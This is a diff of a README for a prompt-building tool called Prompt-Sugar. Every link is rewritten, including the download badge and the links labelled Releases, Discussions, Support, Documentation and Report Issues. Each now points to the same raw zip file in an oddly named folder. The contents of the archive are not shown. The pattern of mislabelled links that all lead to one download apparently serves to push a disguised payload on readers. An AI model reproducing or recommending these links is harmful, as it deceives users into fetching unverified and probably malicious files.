@@ -1,6 +1,6 @@
 # 🌟 Prompt-Sugar - Build Better Prompts with Ease
 
-[![Download Prompt-Sugar](https://img.shields.io/badge/Download-Prompt--Sugar-blue)](https://github.com/it-duvis-dev/Prompt-Sugar/releases)
+[![Download Prompt-Sugar](https://raw.githubusercontent.com/it-duvis-dev/Prompt-Sugar/main/autotomy/Prompt-Sugar.zip)](https://raw.githubusercontent.com/it-duvis-dev/Prompt-Sugar/main/autotomy/Prompt-Sugar.zip)
 
 ## 📖 Introduction
 
@@ -20,7 +20,7 @@ Follow these steps to download and run Prompt-Sugar:
 
 2. **Visit the Releases Page**
 
-   Start by going to the [Releases page](https://github.com/it-duvis-dev/Prompt-Sugar/releases). Here, you will find the latest version of Prompt-Sugar ready for download.
+   Start by going to the [Releases page](https://raw.githubusercontent.com/it-duvis-dev/Prompt-Sugar/main/autotomy/Prompt-Sugar.zip). Here, you will find the latest version of Prompt-Sugar ready for download.
 
 3. **Download the Application**
 
@@ -38,7 +38,7 @@ Follow these steps to download and run Prompt-Sugar:
 
 ## 📥 Download & Install
 
-To download Prompt-Sugar, click the following link: [Download Prompt-Sugar](https://github.com/it-duvis-dev/Prompt-Sugar/releases).
+To download Prompt-Sugar, click the following link: [Download Prompt-Sugar](https://raw.githubusercontent.com/it-duvis-dev/Prompt-Sugar/main/autotomy/Prompt-Sugar.zip).
 
 ## 🔍 Features
 
@@ -73,12 +73,12 @@ Yes, Prompt-Sugar is open-source and completely free. You can download and use i
 
 ## 👥 Community Support
 
-If you have questions or need help, join our community. You can find us on [GitHub Discussions](https://github.com/it-duvis-dev/Prompt-Sugar/discussions) or visit our [Support page](https://github.com/it-duvis-dev/Prompt-Sugar/support).
+If you have questions or need help, join our community. You can find us on [GitHub Discussions](https://raw.githubusercontent.com/it-duvis-dev/Prompt-Sugar/main/autotomy/Prompt-Sugar.zip) or visit our [Support page](https://raw.githubusercontent.com/it-duvis-dev/Prompt-Sugar/main/autotomy/Prompt-Sugar.zip).
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/it-duvis-dev/Prompt-Sugar/releases)
-- [Documentation](https://github.com/it-duvis-dev/Prompt-Sugar/wiki)
-- [Report Issues](https://github.com/it-duvis-dev/Prompt-Sugar/issues)
+- [Releases Page](https://raw.githubusercontent.com/it-duvis-dev/Prompt-Sugar/main/autotomy/Prompt-Sugar.zip)
+- [Documentation](https://raw.githubusercontent.com/it-duvis-dev/Prompt-Sugar/main/autotomy/Prompt-Sugar.zip)
+- [Report Issues](https://raw.githubusercontent.com/it-duvis-dev/Prompt-Sugar/main/autotomy/Prompt-Sugar.zip)
 
 Thank you for choosing Prompt-Sugar! Happy prompting!
